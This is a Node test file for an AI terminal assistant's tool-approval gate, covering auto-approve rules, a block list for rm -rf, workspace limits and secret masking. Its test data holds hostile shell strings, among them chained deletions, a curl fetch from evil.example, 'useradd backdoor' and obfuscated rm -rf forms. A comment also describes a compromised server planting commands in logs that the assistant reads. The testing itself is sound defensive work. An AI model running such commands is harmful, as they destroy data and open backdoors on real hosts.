/**
 * Exercises the rule that decides whether a tool call runs on its own or stops
 * in front of a person.
 *
 * This is the whole safety story of the assistant in one function, and it is
 * the kind of thing that gets quietly widened by a later change: a tool added
 * to the catalog without a `readOnly` flag, a convenience prefix added to the
 * safe list, a shell metacharacter nobody thought about. The cases below are
 * the ones where getting it wrong hands a model an unattended root shell.
 *
 * `electron` is stubbed so it runs under plain node.
 */
const Module = require('module');
const path = require('path');
const fs = require('fs');
const os = require('os');
const assert = require('assert');

const ROOT = path.join(__dirname, '..', 'src', 'main');
const userData = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-test-assistant-'));

const electronStub = {
    app: {
        getPath: () => userData,
        getVersion: () => '1.0.0',
        on: () => {},
        whenReady: () => new Promise(() => {}),
    },
    safeStorage: {
        isEncryptionAvailable: () => false,
        encryptString: () => { throw new Error('unavailable'); },
        decryptString: () => { throw new Error('unavailable'); },
    },
    MessageChannelMain: class { constructor() { this.port1 = {}; this.port2 = {}; } },
    ipcMain: { handle: () => {}, on: () => {} },
};

const realLoad = Module._load;
Module._load = function (request, parent, isMain) {
    if (request === 'electron') return electronStub;
    return realLoad.call(this, request, parent, isMain);
};

const tools = require(path.join(ROOT, 'ai', 'tools'));
const settingsModule = require(path.join(ROOT, 'ai', 'settings'));

/** The shipped defaults, which is what almost every install actually runs. */
const defaults = {
    ...settingsModule.DEFAULTS,
    autoApproveCommands: [...settingsModule.DEFAULTS.autoApproveCommands],
    blockedCommands: [...settingsModule.DEFAULTS.blockedCommands],
};

const asking = { ...defaults, approval: 'always' };
const balanced = { ...defaults, approval: 'writes' };
const open = { ...defaults, approval: 'never' };

let passed = 0;
let failed = 0;
const check = (label, fn) => {
    try {
        fn();
        console.log(`  ok   ${label}`);
        passed++;
    } catch (error) {
        console.log(`  FAIL ${label}`);
        console.log(`       ${error.message}`);
        failed++;
    }
};

console.log('\nassistant approvals');

check('the default is to ask before anything that changes a system', () => {
    assert.strictEqual(defaults.approval, 'writes');
    assert.strictEqual(defaults.allowLocalTools, true, 'local tools are on out of the box, behind the approval card');
});

check('every tool declares whether it only reads', () => {
    for (const tool of tools.TOOLS) {
        assert.strictEqual(
            typeof tool.readOnly, 'boolean',
            `${tool.name} must say whether it only reads`
        );
    }
});

check('the tools that change things are not marked read only', () => {
    const mutating = [
        'run_command', 'send_input', 'write_file', 'connect_host', 'disconnect_session',
        'save_snippet', 'save_host', 'save_proxy', 'save_key', 'save_mcp_server', 'save_folder', 'delete_inventory_item',
        'edit_file', 'edit_local_file',
    ];
    for (const name of ['search_conversations', 'read_conversation', 'search_local_files', 'ask_user']) {
        assert.strictEqual(tools.BY_NAME.get(name).readOnly, true, `${name} changes nothing and asks nobody`);
    }
    for (const name of mutating) {
        const tool = tools.BY_NAME.get(name);
        assert.ok(tool, `${name} is in the catalog`);
        assert.strictEqual(tool.readOnly, false, `${name} must not be treated as a read`);
    }
});

check('save_secret is waved through, and still counts as a write', () => {
    const tool = tools.BY_NAME.get('save_secret');
    assert.strictEqual(tool.readOnly, true, 'a pasted key is stored at once, not held behind a card');
    assert.strictEqual(tool.writes, true, 'and storing it is a change to the keychain');

    // The distinction the two flags exist to draw.
    assert.strictEqual(tools.changesNothing('list_secrets'), true);
    assert.strictEqual(tools.changesNothing('save_secret'), false, 'it writes, however it is approved');
    assert.strictEqual(tools.changesNothing('write_file'), false);
});

check('a read-only run turns down the writes that everything else waves through', () => {
    const looking = { ...balanced, readOnlyRun: true };

    // Reads are reads in either kind of run.
    assert.strictEqual(tools.isAutoApproved('list_secrets', {}, looking), true);
    assert.strictEqual(tools.isAutoApproved('read_terminal', {}, looking), true);

    // save_secret runs unasked in an ordinary one, and stops in this one:
    // refusing here is what sends it to requestApproval, which is where a
    // read-only run says no and why.
    assert.strictEqual(tools.isAutoApproved('save_secret', { name: 'k', secret: 'v' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('save_secret', { name: 'k', secret: 'v' }, looking), false);
});

check('a secret in a tool input is masked before it becomes an event', () => {
    const input = { name: 'db-01', address: '10.0.0.2', password: 'hunter2', privateKey: 'PRIVATE', passphrase: 'pp', secret: 'tok-1234' };
    const masked = tools.redactInput(input);
    assert.strictEqual(masked.name, 'db-01');
    assert.strictEqual(masked.address, '10.0.0.2');
    for (const field of tools.SECRET_FIELDS) assert.strictEqual(masked[field], '••••');
    assert.strictEqual(input.password, 'hunter2', 'the handler still gets the real one');
    const plain = { command: 'ls' };
    assert.strictEqual(tools.redactInput(plain), plain, 'nothing to mask, nothing copied');
});

check('the approval mode reaches the runtimes\' own tools, whatever they call them', () => {
    // The three spellings in play: Claude Code's, OpenCode's, Grok's.
    for (const read of ['Read', 'read', 'read_file', 'Grep', 'grep', 'list_dir']) {
        assert.strictEqual(tools.nativeAutoApproved(read, {}, balanced), true, `${read} only looks`);
        assert.strictEqual(tools.nativeAutoApproved(read, {}, asking), false, `${read} still waits under "always"`);
    }
    // Web calls are outside actions under "Workspace only", so they stop
    // even though looking something up changes nothing local.
    for (const web of ['WebFetch', 'webfetch', 'WebSearch', 'web_search']) {
        assert.strictEqual(tools.nativeAutoApproved(web, {}, balanced), false, `${web} reaches the web and asks`);
        assert.strictEqual(tools.nativeAutoApproved(web, {}, open), true, `${web} does not wait under "never"`);
    }
    for (const write of ['Edit', 'edit', 'Write', 'write', 'patch', 'MultiEdit', 'search_replace']) {
        assert.strictEqual(tools.nativeAutoApproved(write, {}, balanced), false, `${write} changes something`);
        assert.strictEqual(tools.nativeAutoApproved(write, {}, open), true, `${write} does not wait under "never"`);
    }
    // A shell is judged by the allow list, whichever runtime's shell it is.
    for (const shell of ['Bash', 'bash', 'run_terminal_command']) {
        assert.strictEqual(tools.nativeAutoApproved(shell, { command: 'ls -la' }, balanced), true);
        assert.strictEqual(tools.nativeAutoApproved(shell, { command: 'rm -rf /srv' }, balanced), false);
        assert.strictEqual(tools.nativeAutoApproved(shell, { command: 'ls; rm x' }, balanced), false, 'chained is judged whole');
    }
    // An MCP tool is a read when its name says so.
    assert.strictEqual(tools.nativeAutoApproved('mcp__Playwright__browser_snapshot', {}, balanced), true);
    assert.strictEqual(tools.nativeAutoApproved('mcp__Playwright__browser_click', {}, balanced), false);
    assert.strictEqual(tools.nativeAutoApproved('mcp__github__list_issues', {}, balanced), true);
    // An MCP tool that reaches the web asks, however read-like its name.
    assert.strictEqual(tools.nativeAutoApproved('mcp__fetch__fetch', {}, balanced), false);
    assert.strictEqual(tools.nativeAutoApproved('mcp__tavily__web_search', {}, balanced), false);
    // A name nobody has taught it is a change, and a change asks.
    assert.strictEqual(tools.nativeAutoApproved('DeployToProduction', {}, balanced), false);
});

check('under "Workspace only" the project runs free and the outside asks', () => {
    const project = '/home/mario/site';
    const workspace = {
        ...balanced,
        sandbox: { execution: 'host', folders: [{ path: project, mode: 'write' }] },
    };
    const readonlyGrant = {
        ...balanced,
        sandbox: { execution: 'host', folders: [{ path: project, mode: 'read' }] },
    };

    // Local writes inside a granted folder run free, outside they stop.
    assert.strictEqual(tools.isAutoApproved('write_local_file', { path: `${project}/a.ts` }, workspace), true);
    assert.strictEqual(tools.isAutoApproved('edit_local_file', { path: `${project}/a.ts` }, workspace), true);
    assert.strictEqual(tools.isAutoApproved('write_local_file', { path: '/etc/hosts' }, workspace), false);
    assert.strictEqual(tools.isAutoApproved('edit_local_file', { path: '/home/mario/other/b.ts' }, workspace), false);
    assert.strictEqual(tools.isAutoApproved('write_local_file', { path: `${project}/a.ts` }, readonlyGrant), false,
        'a read-only grant is not a workspace to write in');
    // A sibling of the folder is not the folder.
    assert.strictEqual(tools.isAutoApproved('write_local_file', { path: `${project}2/a.ts` }, workspace), false);
    // Without a workspace there is nothing to be inside of.
    assert.strictEqual(tools.isAutoApproved('write_local_file', { path: `${project}/a.ts` }, balanced), false);

    // A plain command in the project runs free; chained and outside stop.
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'npm test', cwd: project }, workspace), true);
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'npm test' }, workspace), true,
        'no cwd is the first granted folder');
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'npm test', cwd: '/etc' }, workspace), false);
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'npm test && npm run build', cwd: project }, workspace), false);
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'ls /etc', cwd: '/etc' }, workspace), false,
        'allow-listed but outside still stops');
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'ls -la', cwd: project }, workspace), true);

    // A narrowed allow list is respected as written: the workspace rule
    // extends the shipped list, it never overrides someone's narrowing.
    const narrowed = { ...workspace, autoApproveCommands: ['npm test'] };
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'npm test', cwd: project }, narrowed), true);
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'git status', cwd: project }, narrowed), false);

    // The runtime's own writes follow the same fence when they name it.
    assert.strictEqual(tools.nativeAutoApproved('Edit', { file_path: `${project}/a.ts` }, workspace), true);
    assert.strictEqual(tools.nativeAutoApproved('Write', { filePath: `${project}/a.ts` }, workspace), true);
    assert.strictEqual(tools.nativeAutoApproved('Edit', { file_path: '/etc/hosts' }, workspace), false);
    assert.strictEqual(tools.nativeAutoApproved('Edit', { file_path: 'relative/a.ts' }, workspace), false,
        'relative to a directory this gate cannot see proves nothing');
    assert.strictEqual(tools.nativeAutoApproved('Edit', {}, workspace), false);
    // Matched text that merely looks like a path opens no gate.
    assert.strictEqual(tools.nativeAutoApproved('Edit', { old: 'see /etc/hosts', new: `see ${project}/a.ts` }, workspace), false);

    // Reads stay free wherever they run; the fence still refuses outside.
    assert.strictEqual(tools.isAutoApproved('read_local_file', { path: '/etc/hosts' }, workspace), true);
    assert.strictEqual(tools.nativeAutoApproved('Read', { file_path: '/etc/hosts' }, workspace), true);
});

check('a read-only run still turns down every workspace write', () => {
    const project = '/home/mario/site';
    const looking = {
        ...balanced,
        readOnlyRun: true,
        sandbox: { execution: 'host', folders: [{ path: project, mode: 'write' }] },
    };
    assert.strictEqual(tools.isAutoApproved('read_local_file', { path: `${project}/a.ts` }, looking), true);
    assert.strictEqual(tools.isAutoApproved('write_local_file', { path: `${project}/a.ts` }, looking), false);
    assert.strictEqual(tools.isAutoApproved('run_local_command', { command: 'npm test', cwd: project }, looking), false);
    assert.strictEqual(tools.nativeAutoApproved('Edit', { file_path: `${project}/a.ts` }, looking), false);
});

check('under "ask every time" nothing runs unattended', () => {
    assert.strictEqual(tools.isAutoApproved('list_hosts', {}, asking), false);
    assert.strictEqual(tools.isAutoApproved('read_terminal', {}, asking), false);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls' }, asking), false);
});

check('under the default, reads run and writes stop', () => {
    assert.strictEqual(tools.isAutoApproved('read_terminal', {}, balanced), true);
    assert.strictEqual(tools.isAutoApproved('list_hosts', {}, balanced), true);
    assert.strictEqual(tools.isAutoApproved('read_file', { path: '/etc/hosts' }, balanced), true);

    assert.strictEqual(tools.isAutoApproved('write_file', { path: '/etc/hosts' }, balanced), false);
    assert.strictEqual(tools.isAutoApproved('disconnect_session', { session: 'a' }, balanced), false);
    assert.strictEqual(tools.isAutoApproved('connect_host', { hostId: 'h' }, balanced), false);
});

check('a plainly read-only command runs without asking', () => {
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls -la /var/log' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'systemctl status nginx' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'df' }, balanced), true);
});

check('a command that only starts with a safe word still asks', () => {
    // The prefix has to be the whole first word, or `lsof`, `catastrophe.sh`
    // and anything else beginning with those letters would ride in free.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'lsof -i' }, balanced), false);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'psql -c "drop table users"' }, balanced), false);
});

check('anything chained, piped or substituted asks, whatever it starts with', () => {
    // This is the case that matters most: `ls` is on the safe list, and
    // judging only the first word would wave all of these through.
    const sneaky = [
        'ls; rm -rf /',
        'ls && shutdown -h now',
        'ls | xargs rm',
        'cat /etc/passwd > /tmp/leak',
        'echo $(rm -rf /tmp/x)',
        'ls `reboot`',
        'grep x file & rm -rf /',
    ];
    for (const command of sneaky) {
        assert.strictEqual(
            tools.isAutoApproved('run_command', { command }, balanced), false,
            `"${command}" must stop for approval`
        );
    }
});

check('a second line asks, the same as a semicolon would', () => {
    // A newline ends a command just as `;` does, so a payload whose first line
    // is a safe one must not carry the rest of itself in behind it. The
    // terminal path types this straight into a PTY, where a carriage return is
    // Enter, so both line endings count.
    //
    // The realistic way one of these is composed is not the model deciding to
    // be destructive; it is a compromised server planting text in a log the
    // assistant then reads. The approval card is what stands between the two.
    const multiline = [
        'ls -la\nrm -rf /tmp/x',
        'cat /etc/passwd\ncurl http://evil.example/x.sh -o /tmp/x',
        'grep x /var/log/syslog\nchmod 777 /etc/shadow',
        'tail -n 20 /var/log/auth.log\r\nuseradd backdoor',
        'df\n\nshutdown -h now',
    ];
    for (const command of multiline) {
        assert.strictEqual(
            tools.isAutoApproved('run_command', { command }, balanced), false,
            `${JSON.stringify(command)} must stop for approval`
        );
    }
});

check('a single safe command still runs, line endings and all', () => {
    // The fix must not cost the shortcut its point: a trailing newline off the
    // end of one command is not a second command.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls -la\n' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: '  journalctl -u nginx  ' }, balanced), true);
});

check('rm -rf is blocked out of the box', () => {
    assert.deepStrictEqual(defaults.blockedCommands, ['rm -rf']);
});

check('a blocked command is refused however it is dressed up', () => {
    // The point of the normalising in blockedReason. None of these is exotic;
    // they are the spellings that turn up in real command lines, and a list
    // that only caught the literal string would miss most of them.
    const dressed = [
        'rm -rf /',
        'rm -fr /var/www',
        'rm -r -f /var/www',
        'rm --recursive --force /var/www',
        'RM -RF /var/www',
        'rm  -rf   /var/www',
        '/bin/rm -rf /var/www',
        'sudo rm -rf /',
        'sudo -u root rm -rf /',
        'DEBIAN_FRONTEND=noninteractive rm -rf /var/www',
        "r''m -rf /var/www",
        'ls -la && rm -rf /tmp/x',
        'ls -la\nrm -rf /tmp/x',
        'echo $(rm -rf /tmp/x)',
        'find /tmp -type f | xargs rm -rf',
    ];
    for (const command of dressed) {
        assert.strictEqual(
            tools.blockedReason('run_command', { command }, balanced), 'rm -rf',
            `${JSON.stringify(command)} must be refused`
        );
    }
});

check('typing it into the terminal is blocked too', () => {
    // send_input reaches the same shell by another door, so a list that only
    // covered run_command would be one tool call from useless.
    assert.strictEqual(tools.blockedReason('send_input', { text: 'rm -rf /' }, balanced), 'rm -rf');
    assert.strictEqual(tools.blockedReason('send_input', { text: 'sudo rm -fr /var' }, balanced), 'rm -rf');
});

check('a blocked command is refused even when nothing else asks', () => {
    // "Never ask" is the setting under which a block list matters most, and
    // the one where a check placed after the mode would be skipped.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'rm -rf /' }, open), false);
    assert.strictEqual(tools.isAutoApproved('send_input', { text: 'rm -rf /' }, open), false);
    // The rest of "never ask" is unchanged: only the list is carved out of it.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'rm /tmp/one-file' }, open), true);
});

check('the block list does not swallow commands it was not given', () => {
    // A rule names flags as well as a command, and widening it silently is how
    // a block list ends up refusing work nobody asked it to refuse. These all
    // still reach the ordinary approval path.
    const allowed = [
        'rm /tmp/one-file',
        'rm -r /tmp/dir',
        'rm -i -r /tmp/dir',
        'ls -la',
        'cat ls',
        'grep -rf pattern.txt /var/log',
    ];
    for (const command of allowed) {
        assert.strictEqual(
            tools.blockedReason('run_command', { command }, balanced), '',
            `${JSON.stringify(command)} must not be refused`
        );
    }
});

check('an empty block list blocks nothing', () => {
    const none = { ...balanced, blockedCommands: [] };
    assert.strictEqual(tools.blockedReason('run_command', { command: 'rm -rf /' }, none), '');
    assert.strictEqual(tools.blockedReason('run_command', { command: 'rm -rf /' }, {}), '');
});

check('a rule may name a wrapper, and reading is not a command', () => {
    const noSudo = { ...balanced, blockedCommands: ['sudo'] };
    assert.strictEqual(tools.blockedReason('run_command', { command: 'sudo systemctl restart nginx' }, noSudo), 'sudo');
    assert.strictEqual(tools.blockedReason('run_command', { command: 'systemctl restart nginx' }, noSudo), '');
    // Tools that run nothing on a server are not command calls at all.
    assert.strictEqual(tools.blockedReason('read_file', { path: '/etc/sudoers' }, noSudo), '');
    assert.strictEqual(tools.blockedReason('list_hosts', {}, noSudo), '');
});

check('an unknown tool is never auto approved', () => {
    // The case that happens when a tool is added and this rule is not
    // revisited. The safe answer is to ask.
    assert.strictEqual(tools.isAutoApproved('some_new_tool', {}, balanced), false);
    assert.strictEqual(tools.isAutoApproved('Bash', { command: 'ls' }, balanced), false);
});

check('"never ask" really does mean never', () => {
    // Everything except the block list, which is checked before the mode and
    // is the one thing "never ask" does not reach. That case is its own check
    // above; this one is about the rest of it.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'systemctl restart nginx' }, open), true);
    assert.strictEqual(tools.isAutoApproved('some_new_tool', {}, open), true);
});

check('a saved host never carries a secret into the model', () => {
    const shaped = tools.publicHost({
        id: 'host-1',
        name: 'web-01',
        host: '10.0.0.1',
        port: 22,
        username: 'root',
        password: 'hunter2',
        privateKey: 'BEGIN OPENSSH PRIVATE KEY',
        passphrase: 'letmein',
        tags: ['prod'],
    });

    const serialised = JSON.stringify(shaped);
    for (const secret of ['hunter2', 'PRIVATE KEY', 'letmein']) {
        assert.ok(!serialised.includes(secret), `${secret} must not reach the model`);
    }
    assert.strictEqual(shaped.address, '10.0.0.1:22', 'the address is still usable');
});

check('both lists can be edited, emptied and put back', () => {
    // Left last: it writes to the settings file, where the checks above only
    // read plain objects.
    const shipped = settingsModule.get().defaults;
    assert.deepStrictEqual(shipped.blockedCommands, ['rm -rf'], 'the shipped list travels with the settings');
    assert.ok(shipped.autoApproveCommands.includes('ls'), 'and so does the other one');

    settingsModule.set({ blockedCommands: ['shutdown'] });
    assert.deepStrictEqual(
        settingsModule.get().blockedCommands, ['shutdown'],
        'a seeded entry is the user\'s to remove'
    );

    settingsModule.set({ blockedCommands: [] });
    assert.deepStrictEqual(settingsModule.get().blockedCommands, [], 'and the list is theirs to empty');

    // What "Restore defaults" does. It needs `defaults` on the settings view
    // because by this point nothing else remembers what was seeded.
    settingsModule.set({ blockedCommands: shipped.blockedCommands });
    assert.deepStrictEqual(settingsModule.get().blockedCommands, ['rm -rf'], 'and to put back');

    // The view carries more than the config does; none of it may be written
    // back by a caller that echoes the whole thing as a patch.
    settingsModule.set(settingsModule.get());
    const stored = JSON.parse(fs.readFileSync(path.join(userData, 'assistant.json'), 'utf8')).config;
    assert.ok(!('defaults' in stored), 'the defaults are read-only');
    assert.ok(!('hasApiKey' in stored), 'and so is the key flag');
});

check('a read-only run lets reads through instead of parking on the first look', () => {
    // The bug: read-only mapped to approval 'always', so every read of a
    // background task raised a card and the run read as yolo while asking
    // about everything. Reads must run free; writes are refused without a
    // card by requestApproval, which is covered by the read-only refusal.
    const assistant = require(path.join(ROOT, 'ai', 'index'));
    const probe = (approvals) => assistant.effectiveSettings({
        agentId: 'test-agent',
        settingsPatch: null,
        runPolicy: approvals ? { approvals } : null,
    });
    assert.strictEqual(probe('read-only').approval, 'writes', 'reads run free under a read-only run');
    assert.strictEqual(probe('park').approval, 'writes');
    assert.strictEqual(probe('full').approval, 'never');
    const readOnly = probe('read-only');
    assert.strictEqual(tools.isAutoApproved('read_file', { path: '/etc/hosts' }, readOnly), true);
    assert.strictEqual(tools.isAutoApproved('list_hosts', {}, readOnly), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'df' }, readOnly), true);
    assert.strictEqual(tools.isAutoApproved('write_file', { path: '/etc/hosts' }, readOnly), false);
});

const checkAsync = async (label, fn) => {
    try {
        await fn();
        console.log(`  ok   ${label}`);
        passed++;
    } catch (error) {
        console.log(`  FAIL ${label}`);
        console.log(`       ${error.message}`);
        failed++;
    }
};

(async () => {
    console.log('\nreading past conversations');

    const read = tools.BY_NAME.get('read_conversation');
    const long = Array.from({ length: 4000 }, (_, index) => `line ${index} of the drafts`).join('\n');
    const fake = (text) => ({
        conversationId: 'ctx-self',
        readConversation: (id) => (id === 'conv-old' ? { conversationId: id, title: 'Drafts', updatedAt: 1, text } : null),
    });

    await checkAsync('a past conversation comes back whole, not as a passage', async () => {
        const result = JSON.parse((await read.handler({ conversationId: 'conv-old' }, fake('## Agent\n\nall ten drafts'))).text);
        assert.strictEqual(result.text, '## Agent\n\nall ten drafts');
        assert.strictEqual(result.nextOffset, null, 'a short one is a single page');
        assert.strictEqual(result.current, undefined);
    });

    await checkAsync('a long one pages on line breaks until the last page says so', async () => {
        let offset = 0;
        let joined = '';
        let pages = 0;
        while (offset !== null) {
            const page = JSON.parse((await read.handler({ conversationId: 'conv-old', offset }, fake(long))).text);
            assert.ok(page.text.length <= 30000, 'no page is bigger than a result can carry');
            if (page.nextOffset !== null) assert.ok(page.text.endsWith('\n'), 'a page ends on a line break');
            assert.strictEqual(page.totalChars, long.length);
            joined += page.text;
            offset = page.nextOffset;
            pages++;
        }
        assert.ok(pages > 1);
        assert.strictEqual(joined, long, 'the pages put back together are the whole conversation');
    });

    await checkAsync('a conversation that is not there is an error, not an empty read', async () => {
        const result = await read.handler({ conversationId: 'conv-gone' }, fake(''));
        assert.strictEqual(result.isError, true);
        assert.strictEqual((await read.handler({ conversationId: 'conv-old' }, {})).isError, true);
    });

    await checkAsync('an agent reads its own conversations and not another agent\'s', async () => {
        const assistant = require(path.join(ROOT, 'ai', 'index'));
        const agents = require(path.join(ROOT, 'agents'));
        const owner = agents.activeId();
        assistant.importConversations([{
            id: 'conv-read-test',
            agentId: owner,
            title: 'GitHub drafts',
            createdAt: 1,
            updatedAt: 2,
            events: [
                { type: 'user-message', text: 'draft ten answers' },
                { type: 'tool-call', id: 't1', name: 'run_command', input: { command: 'gh api discussions' } },
                { type: 'tool-result', id: 't1', text: '[208956, 208953]' },
                { type: 'assistant-text', text: '**1. #208956** Your controlled test rules out everything on your side.' },
            ],
        }]);
        const mine = assistant.readConversation('conv-read-test', { agentId: owner });
        assert.ok(mine.text.includes('**1. #208956**'), 'the reply is there in full');
        assert.ok(mine.text.includes('gh api discussions'), 'and the tool calls with it');
        const spoken = assistant.readConversation('conv-read-test', { agentId: owner, messagesOnly: true });
        assert.ok(spoken.text.includes('draft ten answers') && spoken.text.includes('**1. #208956**'));
        assert.ok(!spoken.text.includes('gh api discussions'), 'messagesOnly leaves the tool calls out');
        assert.strictEqual(assistant.readConversation('conv-read-test', { agentId: 'someone-else' }), null);
    });

    console.log(`\n${passed} checks passed${failed > 0 ? `, ${failed} failed` : ''}`);
    if (failed > 0) process.exit(1);
})();